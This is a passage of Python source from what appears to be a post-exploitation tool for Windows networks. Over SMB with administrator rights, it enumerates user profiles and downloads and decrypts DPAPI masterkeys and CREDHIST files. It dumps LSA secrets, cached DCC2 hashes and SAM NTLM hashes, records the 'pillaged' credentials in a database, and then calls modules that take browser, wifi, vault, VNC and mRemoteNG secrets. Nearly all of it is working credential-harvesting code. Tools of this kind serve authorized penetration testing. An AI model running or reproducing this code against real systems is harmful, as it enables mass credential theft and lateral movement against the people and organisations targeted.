				longname, is_directory = infos
				if is_directory and longname not in blacklist:
					for user in self.users:
						if longname == user.username:
							break
					else:
						self.users.append(MyUser(longname,self.logging,self.options))
						self.logging.info(f"[{self.options.target_ip}] [+] Found user {bcolors.OKBLUE}{longname}{bcolors.ENDC}")
						user=self.GetUserByName(longname)
						self.db.add_user(username=user.username, pillaged_from_computer_ip=self.options.target_ip)
						user.share='C$'
		else:
			for share in shares:
				self.myfileops.do_use(share)
				#self.pwd = 'Users'
				completion=self.myfileops.do_ls('Users','*', display=False)
				for infos in completion:
					longname, is_directory = infos
					if is_directory and longname not in blacklist:
						for user in self.users:
							if longname == user['username']:
								break
						else:
							self.users.append(MyUser(longname,self.logging,self.options))
							self.logging.debug(f"[{self.options.target_ip}] Found user {bcolors.OKBLUE}{longname}{bcolors.ENDC}")
							user = self.GetUserByName(longname)
							self.db.add_user(username=user.username, pillaged_from_computer_ip=self.options.target_ip)
							user.share = share
		#+ADD LOCAL MACHINE ACCOUNT
		user = MyUser("MACHINE$", self.logging, self.options)
		user.type = 'MACHINE'
		user.share = 'C$'
		self.users.append(user)
		self.db.add_user(username=user.username, pillaged_from_computer_ip=self.options.target_ip)
		return self.users

	def get_masterkeys(self):
		self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKBLUE}[+] Gathering masterkeys on the target{bcolors.ENDC}")
		blacklist = ['.', '..']
		# self.get_shares()
		#self.get_users()
		for user in self.users:
			if user.username != 'MACHINE$':
				try:
					tmp_pwd = ntpath.join(ntpath.join('Users', user.username),'AppData\\Roaming\\Microsoft\\Protect')
					self.logging.debug(f"[{self.options.target_ip}] Looking for {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Masterkey in %s" % tmp_pwd)
					my_directory = self.myfileops.do_ls(tmp_pwd,'', display=True)
					for infos in my_directory:
						try:
							longname, is_directory = infos
							if longname not in blacklist:
								self.logging.debug(f"[{self.options.target_ip}] Analysing {longname} for Masterkeys")
								if is_directory and longname[:2] == 'S-':  # SID
									self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKBLUE}{user.username}{bcolors.ENDC} - Found SID {longname}")
									user.sid = longname
									if user.sid.startswith('S-1-5-80'):
										self.logging.debug(f"[{self.options.target_ip}] {bcolors.FAIL}{user.username}{bcolors.ENDC} - Found AD CONNECT SID {longname}")
										user.is_adconnect = True
									#user.check_usertype()
									tmp_pwd2 = ntpath.join(tmp_pwd, longname)
									my_directory2 = self.myfileops.do_ls(tmp_pwd2,'', display=False)
									for infos2 in my_directory2:
										longname2, is_directory2 = infos2
										if not is_directory2 and is_guid(longname2):  # GUID
											self.download_masterkey(user, tmp_pwd2, longname2, type='USER')
								elif is_directory:
									self.logging.debug(f"[{self.options.target_ip}] Found Directory %s -> doing nothing" % longname)
								else:
									self.logging.debug(f"[{self.options.target_ip}] Found file %s" % longname)
									if "CREDHIST" in longname:
										self.download_credhist(user, tmp_pwd, longname, type='USER')
						except Exception as ex:
							self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception in get_masterkeys for {longname}{bcolors.ENDC}")
							self.logging.debug(ex)
							continue
				except Exception as ex:
					self.logging.debug(
						f"[{self.options.target_ip}] {bcolors.WARNING}Exception get_masterkeys{bcolors.ENDC}")
					self.logging.debug(ex)
					continue
		##MACHINE MASTERKEYS
		try:
			user=self.GetUserByName('MACHINE$')
			#Make a "MACHINE$" user
			"""user=MyUser("MACHINE$",self.logging,self.options)
			user.type='MACHINE'
			self.users.append(user)"""

			tmp_pwd = 'Windows\\System32\\Microsoft\\Protect'#Add Windows\ServiceProfiles\ADSync\AppData\Roaming\Microsoft\Protect\ for ADConnect ?
			self.logging.debug(f"[{self.options.target_ip}] Looking for Machine Masterkey in %s" % tmp_pwd)
			my_directory = self.myfileops.do_ls(tmp_pwd,'', display=False)
			for infos in my_directory:
				longname, is_directory = infos
				if longname not in blacklist:
					if is_directory and longname[:2] == 'S-':  # SID
						self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKBLUE}{user.username}{bcolors.ENDC} - Found SID {longname}")
						user.sid = longname
						if user.sid.startswith('S-1-5-80'):
							self.logging.debug(f"[{self.options.target_ip}] {bcolors.FAIL}{user.username}{bcolors.ENDC} - Found AD CONNECT SID {longname}")
							user.is_adconnect = True
						tmp_pwd2 = ntpath.join(tmp_pwd, longname)
						my_directory2 = self.myfileops.do_ls(tmp_pwd2,'', display=False)
						for infos2 in my_directory2:
							longname2, is_directory2 = infos2
							if longname2 not in blacklist:
								if not is_directory2 and is_guid(longname2):  # GUID
									# Downloading file
									self.download_masterkey(user, tmp_pwd2, longname2, type='MACHINE')
								elif is_directory2 and longname2=='User': #On se limite a ca pour le moment
									tmp_pwd3 = ntpath.join(tmp_pwd2, longname2)
									my_directory3 = self.myfileops.do_ls(tmp_pwd3,'', display=False)
									for infos3 in my_directory3:
										longname3, is_directory3 = infos3
										if longname3 not in blacklist:
											if not is_directory3 and is_guid(longname3):  # GUID
												self.logging.debug(f"[{self.options.target_ip}] {user.username} - Found GUID {longname3}")
												# Downloading file
												self.download_masterkey(user, tmp_pwd3, longname3, type='MACHINE-USER')
											else:
												self.logging.debug(
													"Found unexpected file/directory %s in %s" % (tmp_pwd3, longname3))
								else:
									self.logging.debug("Found unexpected file/directory %s in %s"%(tmp_pwd2,longname2))
					elif is_directory:
						self.logging.debug("Found (not SID) Directory %s" % longname)
					else:
						self.logging.debug("Found file %s" % longname)
						if "CREDHIST" in longname:
							self.download_credhist(user, tmp_pwd, longname, type='MACHINE')

		except Exception as ex:
			self.logging.error(f"[{self.options.target_ip}] {bcolors.FAIL}Error in GetMasterkey (Machine){bcolors.ENDC}")
			self.logging.debug(ex)
		self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKBLUE}[-] Gathered Masterkeys for {len(self.users)} users{bcolors.ENDC}")

	def download_credhist(self,user, tmp_pwd, longname, type='MACHINE'):
		# Downloading file
		try:

			self.logging.debug(
				f"[{self.options.target_ip}] [...] Downloading CREDHIST {user.username} {tmp_pwd} {longname}")
			#from lib.dpapi_pick.credhist import CredHistFile
			#localfile = self.myfileops.get_file(ntpath.join(tmp_pwd, longname))
			'''f=open(localfile,'rb')
			credhistdata = f.read()
			f.close()
			myCredhistfile = CredHistFile(raw=credhistdata)

			print(repr(myCredhistfile))
			#myCredhistfile = CredHistFile(raw=credhistdata)
			for username in self.options.credz:
				if username in user.username:  # pour fonctionner aussi avec le .domain ou les sessions multiple citrix en user.domain.001 ?
					self.logging.debug(f"[{self.options.target_ip}] [...] Testing {len(self.options.credz[username])} credz for user {user.username} CREDHIST")
					for password in self.options.credz[username]:
						ret=myCredhistfile.decryptWithPassword(password)
						print(ret)
			'''
		except Exception as ex:
			self.logging.error(f"[{self.options.target_ip}] {bcolors.FAIL}Error in Decrypting Credhist{bcolors.ENDC}")
			self.logging.debug(ex)




	def download_masterkey(self,user,path,guid,type):
		guid=guid.lower()
		if is_guid(guid):
			self.logging.debug(f"[{self.options.target_ip}] {user.username} - Found GUID {guid}")
		# Downloading file
		localfile = self.myfileops.get_file(ntpath.join(path, guid))
		#Get Type and hash
		try:
			myoptions = copy.deepcopy(self.options)
			myoptions.sid = user.sid
			myoptions.username = user.username
			myoptions.pvk = None
			myoptions.file = localfile  # Masterkeyfile to parse
			#myoptions.key = key.decode("utf-8")
			mydpapi = DPAPI(myoptions, self.logging)
			if self.options.GetHashes == True:
				masterkey_hash,is_domain_sid = mydpapi.get_masterkey_hash(generate_hash=True)
			else :
				masterkey_hash, is_domain_sid = mydpapi.get_masterkey_hash(generate_hash=False)
		except Exception as ex:
			self.logging.error(f"[{self.options.target_ip}] {bcolors.FAIL}Error in DownloadMasterkey - get_masterkey_hash{bcolors.ENDC}")
			self.logging.debug(ex)
		try:
			user.masterkeys_file[guid]={}
			user.masterkeys_file[guid]['path'] = localfile
			user.masterkeys_file[guid]['status'] = 'encrypted'
			if self.options.GetHashes == True:
				user.masterkeys_file[guid]['hash'] = masterkey_hash
			if is_domain_sid :
				type='DOMAIN'
				user.type_validated = True
				user.type = type #LOCAL,DOMAIN,MACHINE,MACHINE-USER
			self.db.add_sid(username=user.username,sid=user.sid)
			self.db.add_masterkey(file_path=user.masterkeys_file[guid]['path'], guid=guid,status=user.masterkeys_file[guid]['status'],pillaged_from_computer_ip=self.options.target_ip,pillaged_from_username=user.username)
			if self.options.GetHashes == True:
				for hash in user.masterkeys_file[guid]['hash']:
					self.db.add_dpapi_hash(file_path=user.masterkeys_file[guid]['path'], sid=user.sid, guid=guid, hash=hash, context=type, pillaged_from_computer_ip=self.options.target_ip)
		except Exception as ex:
			self.logging.error(f"[{self.options.target_ip}] {bcolors.FAIL}Error in Database entry - download_masterkey_hash{bcolors.ENDC}")
			self.logging.debug(ex)

	def get_masterkey(self,user,guid,type):
		guid=guid.lower()
		if guid not in user.masterkeys_file :
			self.logging.debug(	f"[{self.options.target_ip}] [!] {bcolors.FAIL}{user.username}{bcolors.ENDC} masterkey {guid} not found")
			return -1
		else:
			self.logging.debug(f"[{self.options.target_ip}] [-] {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} Found")
		if user.masterkeys_file[guid]['status'] == 'decrypted':
			self.logging.debug(f"[{self.options.target_ip}] [-] {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} already decrypted")
			return user.masterkeys_file[guid]
		elif user.masterkeys_file[guid]['status'] == 'encrypted':
			return self.decrypt_masterkey(user,guid,type)


	def decrypt_masterkey(self,user,guid,type=''):
		self.logging.debug(f"[{self.options.target_ip}] [...] Decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} of type {type} (type_validated={user.type_validated}/user.type={user.type})")
		guid=guid.lower()
		if guid not in user.masterkeys_file :
			self.logging.debug(	f"[{self.options.target_ip}] [!] {bcolors.FAIL}{user.username}{bcolors.ENDC} masterkey {guid} not found")
			return -1
		localfile=user.masterkeys_file[guid]['path']

		if user.masterkeys_file[guid]['status'] == 'decrypted':
			self.logging.debug(f"[{self.options.target_ip}] [-] {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} already decrypted")
			return user.masterkeys_file[guid]
		else:
			if user.type_validated == True:
				type=user.type

			if type == 'MACHINE':
				# Try de decrypt masterkey file
				for key in self.machine_key:
					self.logging.debug(f"[{self.options.target_ip}] [...] Decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} with MACHINE_Key from LSA {key.decode('utf-8')}")
					try:
						myoptions = copy.deepcopy(self.options)
						myoptions.sid=None#user.sid
						myoptions.username=user.username
						myoptions.pvk = None
						myoptions.file = localfile  # Masterkeyfile to parse
						myoptions.key = key.decode("utf-8")
						mydpapi = DPAPI(myoptions,self.logging)
						decrypted_masterkey = mydpapi.decrypt_masterkey()
						if decrypted_masterkey!= None and decrypted_masterkey!= -1:
							#self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKGREEN}[...] Maserkey {bcolors.ENDC}{localfile}  {bcolors.ENDC}: {decrypted_masterkey}" )
							user.masterkeys_file[guid]['status'] = 'decrypted'
							user.masterkeys_file[guid]['key'] = decrypted_masterkey
							#user.masterkeys[localfile] = decrypted_masterkey
							user.type='MACHINE'
							user.type_validated = True
							self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKBLUE}Decryption successfull {bcolors.ENDC} of Masterkey {guid} for Machine {bcolors.OKGREEN} {user.username}{bcolors.ENDC}  \nKey: {decrypted_masterkey}")
							self.db.update_masterkey(file_path=user.masterkeys_file[guid]['path'], guid=guid,
							                      status=user.masterkeys_file[guid]['status'],decrypted_with="MACHINE-KEY",decrypted_value=decrypted_masterkey,
							                      pillaged_from_computer_ip=self.options.target_ip,
							                      pillaged_from_username=user.username)
							return user.masterkeys_file[guid]
						else:
							self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING} MACHINE-Key from LSA {key.decode('utf-8')} can't decode {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Masterkey {guid}{bcolors.ENDC}")
					except Exception as ex:
						self.logging.debug(f"[{self.options.target_ip}] Exception {bcolors.WARNING} MACHINE-Key from LSA {key.decode('utf-8')} can't decode {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Masterkey {guid}{bcolors.ENDC}")
						self.logging.debug(ex)
				else:
					#if user.type_validated == False:
					self.decrypt_masterkey(user, guid, type='MACHINE-USER')

			elif type == 'MACHINE-USER':
				# Try de decrypt masterkey file
				for key in self.user_key:
					self.logging.debug(f"[{self.options.target_ip}] [...] Decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} with MACHINE-USER_Key from LSA {key.decode('utf-8')}")#and SID %s , user.sid ))
					try:
						#key1, key2 = deriveKeysFromUserkey(tsid, userkey)
						myoptions = copy.deepcopy(self.options)
						myoptions.file = localfile  # Masterkeyfile to parse
						if user.is_adconnect is True:
							myoptions.key = key.decode("utf-8")
							myoptions.sid = user.sid
						else :
							myoptions.key = key.decode("utf-8")#None
							myoptions.sid = None#user.sid

						myoptions.username = user.username
						myoptions.pvk = None
						mydpapi = DPAPI(myoptions,self.logging)
						decrypted_masterkey = mydpapi.decrypt_masterkey()
						if decrypted_masterkey != -1 and decrypted_masterkey!=None:
							#self.logging.debug(f"[{self.options.target_ip}] Decryption successfull {bcolors.ENDC}: {decrypted_masterkey}")
							user.masterkeys_file[guid]['status'] = 'decrypted'
							user.masterkeys_file[guid]['key'] = decrypted_masterkey
							#user.masterkeys[localfile] = decrypted_masterkey
							user.type = 'MACHINE-USER'
							user.type_validated = True
							self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKBLUE}Decryption successfull {bcolors.ENDC} of Masterkey {guid} for Machine {bcolors.OKGREEN} {user.username}{bcolors.ENDC}  \nKey: {decrypted_masterkey}")
							self.db.update_masterkey(file_path=user.masterkeys_file[guid]['path'], guid=guid,
							                      status=user.masterkeys_file[guid]['status'],
							                      decrypted_with="MACHINE-USER", decrypted_value=decrypted_masterkey,
							                      pillaged_from_computer_ip=self.options.target_ip,
							                      pillaged_from_username=user.username)
							return user.masterkeys_file[guid]
						else:
							self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING} MACHINE-USER_Key from LSA {key.decode('utf-8')} can't decode {bcolors.OKBLUE}{user.username}{bcolors.WARNING}  Masterkey {guid}{bcolors.ENDC}")
					except Exception as ex:
						self.logging.debug(f"[{self.options.target_ip}] Exception {bcolors.WARNING} MACHINE-USER_Key from LSA {key.decode('utf-8')} can't decode {bcolors.OKBLUE}{user.username}{bcolors.WARNING}  Masterkey {guid}{bcolors.ENDC}")
						self.logging.debug(ex)
				else:
					if user.type_validated == False and not user.is_adconnect:
						return self.decrypt_masterkey(user, guid, type='DOMAIN')

			elif type=='DOMAIN' and self.options.pvk is not None :
				#For ADConnect
				if user.is_adconnect is True:
					return self.decrypt_masterkey(user, guid, type='MACHINE-USER')
				# Try de decrypt masterkey file
				self.logging.debug(f"[{self.options.target_ip}] [...] Decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} with Domain Backupkey {self.options.pvk}")
				try:
					myoptions = copy.deepcopy(self.options)
					myoptions.file = localfile  # Masterkeyfile to parse
					myoptions.username = user.username
					myoptions.sid = user.sid
					mydpapi = DPAPI(myoptions,self.logging)
					decrypted_masterkey = mydpapi.decrypt_masterkey()
					if decrypted_masterkey != -1 and decrypted_masterkey!=None:
						#self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKGREEN}Decryption successfull {bcolors.ENDC}: %s" % decrypted_masterkey)
						user.masterkeys_file[guid]['status'] = 'decrypted'
						user.masterkeys_file[guid]['key'] = decrypted_masterkey
						#user.masterkeys[localfile] = decrypted_masterkey
						user.type = 'DOMAIN'
						user.type_validated = True
						self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKBLUE}Decryption successfull {bcolors.ENDC} of Masterkey {guid} for user {bcolors.OKBLUE} {user.username}{bcolors.ENDC}  \nKey: {decrypted_masterkey}")
						self.db.update_masterkey(file_path=user.masterkeys_file[guid]['path'], guid=guid,
						                      status=user.masterkeys_file[guid]['status'], decrypted_with="DOMAIN-PVK",
						                      decrypted_value=decrypted_masterkey,
						                      pillaged_from_computer_ip=self.options.target_ip,
						                      pillaged_from_username=user.username)
						return user.masterkeys_file[guid]
					else:
						self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Domain Backupkey {self.options.pvk} can't decode {bcolors.OKBLUE}{user.username}{bcolors.WARNING} Masterkey {guid} -> Checking with Local user with credz{bcolors.ENDC}")
						if user.type_validated == False:
							return self.decrypt_masterkey(user, guid, 'LOCAL')
				except Exception as ex:
					self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey {guid} with Domain Backupkey (most likely user is only local user) -> Running for Local user with credz{bcolors.ENDC}")
					self.logging.debug(f"exception was : {ex}")
					if user.type_validated == False:
						return self.decrypt_masterkey(user, guid, 'LOCAL')

			#type==LOCAL
			# On a des credz
			if len(self.options.credz) > 0 and user.masterkeys_file[guid]['status'] != 'decrypted': #localfile not in user.masterkeys:
				self.logging.debug(f"[{self.options.target_ip}] [...] Testing decoding {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Masterkey {guid} with credz")
				for username in self.options.credz:
					if username in user.username :#pour fonctionner aussi avec le .domain ou les sessions multiple citrix en user.domain.001 ?
						self.logging.debug(f"[{self.options.target_ip}] [...] Testing {len(self.options.credz[user.username])} credz for user {user.username}")
						#for test_cred in self.options.credz[user.username]:
						try:
							self.logging.debug(f"[{self.options.target_ip}]Trying to decrypt {bcolors.OKBLUE}{user.username}{bcolors.ENDC} Masterkey {guid} with user SID {user.sid} and {len(self.options.credz[username])}credential(s) from credz file")
							myoptions = copy.deepcopy(self.options)
							myoptions.file = localfile  # Masterkeyfile to parse
							#myoptions.password = self.options.credz[username]
							myoptions.sid = user.sid
							myoptions.pvk = None
							myoptions.key = None
							mydpapi = DPAPI(myoptions,self.logging)
							decrypted_masterkey = mydpapi.decrypt_masterkey(passwords=self.options.credz[username])
							if decrypted_masterkey != -1 and decrypted_masterkey!=None:
								#self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKGREEN}Decryption successfull {bcolors.ENDC}: {decrypted_masterkey}")
								user.masterkeys_file[guid]['status'] = 'decrypted'
								user.masterkeys_file[guid]['key'] = decrypted_masterkey
								#user.masterkeys[localfile] = decrypted_masterkey
								user.type = 'LOCAL'
								user.type_validated = True
								self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKBLUE}Decryption successfull {bcolors.ENDC} of Masterkey {guid} for User {bcolors.OKGREEN} {user.username}{bcolors.ENDC}  \nKey: {decrypted_masterkey}")
								self.db.update_masterkey(file_path=user.masterkeys_file[guid]['path'], guid=guid,
								                      status=user.masterkeys_file[guid]['status'],
								                      decrypted_with=f"Password:{self.options.credz[username]}", decrypted_value=decrypted_masterkey,
								                      pillaged_from_computer_ip=self.options.target_ip,
								                      pillaged_from_username=user.username)
								return user.masterkeys_file[guid]
							else :
								self.logging.debug(f"[{self.options.target_ip}] error decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey  {guid} with {len(self.options.credz[username])} passwords from user {username} in cred list")
						except Exception as ex:
							self.logging.debug(f"[{self.options.target_ip}] Except decrypting {bcolors.OKBLUE}{user.username}{bcolors.ENDC} masterkey with {len(self.options.credz[username])} passwords from user {username} in cred list")
							self.logging.debug(ex)
				else:
					self.logging.debug(f"[{self.options.target_ip}] {bcolors.FAIL}no credential in credz file for user {user.username} and masterkey {guid} {bcolors.ENDC}")
			# on a pas su le dechiffrer, mais on conseve la masterkey
			'''if localfile not in user.masterkeys:
				user.masterkeys[localfile] = None'''
			if user.masterkeys_file[guid]['status'] == 'encrypted':
				user.masterkeys_file[guid]['status'] = 'decryption_failed'
				self.db.update_masterkey(file_path=user.masterkeys_file[guid]['path'], guid=guid,
				                      status=user.masterkeys_file[guid]['status'],decrypted_with='', decrypted_value='',
				                      pillaged_from_computer_ip=self.options.target_ip,
				                      pillaged_from_username=user.username)
				return -1
			elif user.masterkeys_file[guid]['status'] == 'decrypted':#Should'nt go here
				return user.masterkeys_file[guid]

	def test_remoteOps(self):
		try:
			#Remove logging
			#logging.getLogger().setLevel(logging.CRITICAL)
			self.logging.info(f"[{self.options.target_ip}] {bcolors.OKBLUE} [+] Dumping LSA Secrets{bcolors.ENDC}")
			self.__remoteOps = RemoteOperations(self.smb, self.options.k, self.options.dc_ip)
			self.__remoteOps.setExecMethod('smbexec')
			self.__remoteOps.enableRegistry()
			self.__bootKey = self.__remoteOps.getBootKey()
			self.logging.debug("bootkey")
			SECURITYFileName = self.__remoteOps.saveSECURITY()
			self.logging.debug("savesecurity")
			self.__LSASecrets = MyLSASecrets(SECURITYFileName, self.__bootKey, self.__remoteOps,isRemote=True, history=True)
			self.logging.debug("LSASecret")
			self.__LSASecrets.dumpCachedHashes()
			self.logging.debug("dump cached hashes")
			self.__LSASecrets.dumpSecrets()

			filedest = os.path.join(os.path.join(self.options.output_directory,self.options.target_ip), 'LSA')
			Path(os.path.split(filedest.replace('\\', '/'))[0]).mkdir(parents=True, exist_ok=True)
			self.logging.debug(f"[{self.options.target_ip}] Dumping LSA Secrets to file {filedest}")
			finalfile=self.__LSASecrets.exportSecrets(filedest)
			self.logging.debug("ret file %s" % finalfile)
			self.__LSASecrets.exportCached(filedest)
			#Analyser les hash DCC2 pour un export massif.
		except Exception as ex:
			self.logging.debug(
				f"[{self.options.target_ip}] Except remoteOps LSA")
			self.logging.debug(ex)
		try:
			tmp_filedest=filedest+'.secrets'
			f=open(tmp_filedest,'rb')
			secrets=f.read().split(b'\n')
			f.close()
			for index,secret in enumerate(secrets):
				if b'dpapi_machinekey' in secret:
					self.logging.info(f"[{self.options.target_ip}] {bcolors.OKBLUE}[-] Found DPAPI Machine key{bcolors.ENDC} : {secret.split(b'dpapi_machinekey:')[1].decode('utf-8')}")
					#print(secret.split(b'dpapi_machinekey:')[1])
					self.machine_key.append(secret.split(b'dpapi_machinekey:')[1])
					self.logging.debug(self.machine_key)
				if b'dpapi_userkey' in secret:
					self.logging.info(f"[{self.options.target_ip}] {bcolors.OKBLUE}[-] Found DPAPI User key{bcolors.ENDC} : {secret.split(b'dpapi_userkey:')[1].decode('utf-8')}")
					self.user_key.append(secret.split(b'dpapi_userkey:')[1])
					self.logging.debug(self.user_key)
				if b':' in secret:
					if secret.count(b':')==1:
						username,password=secret.split(b':')
						if username.decode('utf-8') not in ['dpapi_machinekey','dpapi_userkey','NL$KM']:
							if username.decode('utf-8') not in self.options.credz:
                            
								self.options.credz[username.decode('utf-8')] = [password.decode('utf-8')]
								self.logging.info(f"[{self.options.target_ip}] [+] {bcolors.OKBLUE} LSA : {bcolors.OKGREEN} {username.decode('utf-8')} : {password.decode('utf-8')} {bcolors.ENDC}")

							else:
								if password.decode('utf-8') not in self.options.credz[username.decode('utf-8')]:
									self.options.credz[username.decode('utf-8')].append(password.decode('utf-8'))
									self.logging.info(f"[{self.options.target_ip}] [+] {bcolors.OKBLUE} LSA : {bcolors.OKGREEN} {username.decode('utf-8')} : {password.decode('utf-8')} {bcolors.ENDC}")
							############PROCESSING DATA
							self.db.add_credz(credz_type='LSA',
											  credz_username=username.decode('utf-8'),
											  credz_password=password.decode('utf-8'),
											  credz_target='',
											  credz_path=tmp_filedest,
											  pillaged_from_computer_ip=self.options.target_ip,
											  pillaged_from_username='MACHINE$')

				else:
					self.logging.debug("Secret %i - %s"%(index,secret))
		except Exception as ex:
			self.logging.debug(
				f"[{self.options.target_ip}] Except remoteOps Secrets")
			self.logging.debug(ex)

		try:
			##Add DCC2

			tmp_filedest=filedest+'.cached'
			f=open(tmp_filedest,'rb')
			secrets=f.read().split(b'\n')
			f.close()
			for index,secret in enumerate(secrets):
				if b':' in secret and b'#' in secret:
					if secret.count(b':')==1:
						username,password=secret.split(b':')
						self.logging.debug(f"[{self.options.target_ip}] {bcolors.OKBLUE}[-] Found DCC2 hash :{bcolors.OKGREEN} {secret.decode('utf-8')}{bcolors.ENDC}")
						############PROCESSING DATA
						self.db.add_credz(credz_type='DCC2',
											  credz_username=username.decode('utf-8'),
											  credz_password=password.decode('utf-8'),
											  credz_target='',
											  credz_path=tmp_filedest,
											  pillaged_from_computer_ip=self.options.target_ip,
											  pillaged_from_username='MACHINE$')

				else:
					self.logging.debug("Secret %i - %s"%(index,secret))
		except Exception as ex:
			self.logging.debug(
				f"[{self.options.target_ip}] Except remoteOps LSA DCC2")
			self.logging.debug(ex)

		try:
			#Add SAM
			self.logging.info(f"[{self.options.target_ip}] {bcolors.OKBLUE} [+] Dumping SAM Secrets{bcolors.ENDC}")
			SAMFileName = self.__remoteOps.saveSAM()
			self.__SAMHashes = MySAMHashes(SAMFileName, self.__bootKey, isRemote=True)
			self.__SAMHashes.dump()
			filedest = os.path.join(os.path.join(self.options.output_directory,self.options.target_ip), 'SAM')
			self.__SAMHashes.export(filedest)
			#Adding SAM hash to credz
			tmp_filedest = filedest + '.sam'
			f = open(tmp_filedest, 'rb')
			sam_data = f.read().split(b'\n')
			f.close()
			for sam_line in sam_data:
				if b':' in sam_line:
					if sam_line.count(b':')==6:
						username,sid,lm,ntlm,_,_,_=sam_line.split(b':')
						#On ne l'ajoute pas aux credz, c'est un hash NTLM, il ne peut pas etre utilisé par dpapi
						'''
						if username.decode('utf-8') not in self.options.credz:
							self.options.credz[username.decode('utf-8')] = [ntlm.decode('utf-8')]
						else:
							if ntlm.decode('utf-8') not in self.options.credz[username.decode('utf-8')]:
								self.options.credz[username.decode('utf-8')].append(ntlm.decode('utf-8'))
						'''
						############PROCESSING DATA
						self.db.add_credz(credz_type='SAM',
										  credz_username=username.decode('utf-8'),
										  credz_password=ntlm.decode('utf-8'),
										  credz_target='',
										  credz_path=tmp_filedest,
										  pillaged_from_computer_ip=self.options.target_ip,
										  pillaged_from_username='MACHINE$')
			self.logging.info(f"[{self.options.target_ip}] [+] {bcolors.OKBLUE} SAM : Collected {bcolors.OKGREEN}{len(sam_data)} hashes {bcolors.ENDC}")
			#logging.getLogger().setLevel(logging.DEBUG)
		except Exception as ex:
			self.logging.debug(
				f"[{self.options.target_ip}] Except remoteOps SAM")
			self.logging.debug(ex)
		self.__remoteOps.finish()
		return 1

	def GetRecentFiles(self):
		myRecentFiles = recent_files(self.smb,self.myregops,self.myfileops,self.logging,self.options,self.db,self.users)
		myRecentFiles.run()

	def GetMRemoteNG(self):
		from software.manager.mRemoteNG import mRemoteNG
		myMRemoteNG = mRemoteNG(self.smb,self.myregops,self.myfileops,self.logging,self.options,self.db,self.users)
		myMRemoteNG.run()

	def GetNew_Module(self):
		myNewModule = new_module(self.smb,self.myregops,self.myfileops,self.logging,self.options,self.db,self.users)
		myNewModule.run()

	def do_test(self):

		try:
			if self.admin_privs and True:
				#self.do_info()
				self.do_who()
				self.get_users()
				#

				if self.options.no_remoteops == False:
					try:
						self.test_remoteOps()
					except Exception as ex:
						self.logging.debug(f"[{self.options.target_ip}] Exception in RemoteOps - Maybe blocked by EDR ? ")
						self.logging.debug(f"exception was : {ex}")
						#self.
				if self.options.no_dpapi == False:
					self.get_masterkeys()
					self.Get_DPAPI_Protected_Files()
					self.GetWifi()
					self.GetVaults()
				if self.options.no_browser == False:
					self.GetChormeSecrets()
					self.GetMozillaSecrets_wrapper()
				if self.options.no_vnc == False and self.options.no_sysadmins == False:
					self.GetVNC()
				if self.options.no_sysadmins == False :
					self.GetMRemoteNG()
				if self.options.no_recent == False:
					self.GetRecentFiles()
				"""
				***Dev your new module code and start it from here
				
				if self.options.no_new_module == False:
					self.GetNew_Module()
				"""

				#self.logging.info(f"[{self.options.target_ip}] {bcolors.OKGREEN}*-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=*\n{bcolors.ENDC}")
				#for user in self.users:
					#user.resume_user_info()
					#user.resume_secrets()
			#else:
				#NOT ADMIN
				self.quit()


		except Exception as ex:
			self.logging.debug(f"[{self.options.target_ip}] Not connected")
			self.logging.debug(f"exception was : {ex}")

	def get_secrets(self):
		all_secrets={}
		for user in self.users:
			all_secrets[user]=user.get_secrets()



# DPAPI unprotect
# DPAPI decryptMasterkey
# DPAPI GetDomainBackupMasterKey
# dpapi.py backupkeys -t TOUF/Administrateur:xxxxx@10.0.0.10 --export
#to get Dropbox decrypted databases?
# to get iCloud authentication tokens?
# to decrypt EFS files

#ADConnect 'Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf'
#Program Files\Microsoft Azure AD Sync\Data\ADSync_log.ldf
#optimisation :
#le user est il du domain ou local ?
#dans quel cas peut on dechifffrer avec les hashs ? // si compte admin on se sert des hash locaux/sam ?

#DEV :  [get_file] SMB SessionError: STATUS_SHARING_VIOLATION(A file cannot be opened because the share access flags are incompatible.)
